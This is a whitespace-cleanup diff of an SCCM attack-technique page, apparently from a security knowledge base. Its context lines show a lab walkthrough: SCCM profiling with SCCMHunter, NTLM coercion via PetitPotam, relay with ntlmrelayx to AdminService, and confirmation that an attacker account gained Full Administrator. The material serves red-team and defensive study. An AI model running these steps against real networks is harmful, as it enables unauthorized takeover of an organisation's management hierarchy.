@@ -12,7 +12,7 @@ Hierarchy Takeover via NTLM coercion and relay to AdminService on remote SMS Pro
 ### Coercion
 - Valid Active Directory domain credentials
 - Connectivity to SMB (TCP/445) on a coercion target:
-    - TAKEOVER-5.1: Coerce primary site server 
+    - TAKEOVER-5.1: Coerce primary site server
     - TAKEOVER-5.2: Coerce passive site server
 - Connectivity from the coercion target to SMB (TCP/445) on the relay server
 - Coercion target settings:
@@ -52,14 +52,14 @@ This technique may allow an attacker to relay a site server's domain computer ac
 
 1. Use `SCCMHunter` to profile SCCM infrastructure:
     ```
-    [02:00:25 PM] INFO     [+] Finished profiling all discovered computers.                                   
+    [02:00:25 PM] INFO     [+] Finished profiling all discovered computers.
     [02:00:25 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                         | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                         +=========================+============+=================+==============+===================+=====================+===============+========+=========+
                         | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
                         +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                         | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
-                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
+                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
     ```
 
 2. On the attacker relay server, start `ntlmrelayx` (currently, Garrett Foster's [fork/pull request here](https://github.com/fortra/impacket/pull/1593) must be used until it is merged into impacket), targeting the URL of the AdminService API on the remote SMS Provider identified in the previous step, and provide a target account to add as a Full Administrator:
@@ -88,7 +88,7 @@ This technique may allow an attacker to relay a site server's domain computer ac
 3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:
     ```
     ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 
+    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP>
 
     Trying pipe lsarpc
     [-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
@@ -118,14 +118,14 @@ This technique may allow an attacker to relay a site server's domain computer ac
 
 4. Confirm that the account now has the `Full Administrator` role by querying WMI on an SMS Provider:
     ```
-    $ python3 sccmhunter.py  admin -u specter -p <PASSWORD> -ip SITE-SMS          
+    $ python3 sccmhunter.py  admin -u specter -p <PASSWORD> -ip SITE-SMS
 
-    [14:16:54] INFO     [!] Enter help for extra shell commands                                                                                                                                              
+    [14:16:54] INFO     [!] Enter help for extra shell commands
     () (C:\) >> show_admins
-    [14:17:11] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                              
+    [14:17:11] INFO     Tasked SCCM to list current SMS Admins.
     [14:17:12] INFO     Current Full Admin Users:
-    [14:17:13] INFO     lab\Administrator 
-    [14:17:13] INFO     lab\specter 
+    [14:17:13] INFO     lab\Administrator
+    [14:17:13] INFO     lab\specter
     ```
 
 ## References
